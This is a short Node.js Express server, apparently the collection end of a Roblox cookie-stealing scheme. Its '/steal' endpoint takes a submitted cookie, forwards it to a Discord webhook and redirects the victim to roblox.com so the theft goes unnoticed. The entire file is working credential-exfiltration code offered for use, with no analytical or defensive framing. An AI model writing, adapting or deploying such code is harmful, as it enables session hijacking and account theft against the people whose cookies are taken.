const express = require('express');
const app = express();
app.use(express.json());
app.post('/steal', (req, res) => {
    const cookie = req.body.cookie;
    // Send to Discord webhook
    fetch('https://discord.com/api/webhooks/your-webhook-id', {
        method: 'POST',
        body: JSON.stringify({ content: `Cookie: ${cookie}` }),
        headers: { 'Content-Type': 'application/json' }
    });
    res.redirect('https://www.roblox.com/');
});
app.listen(3000);
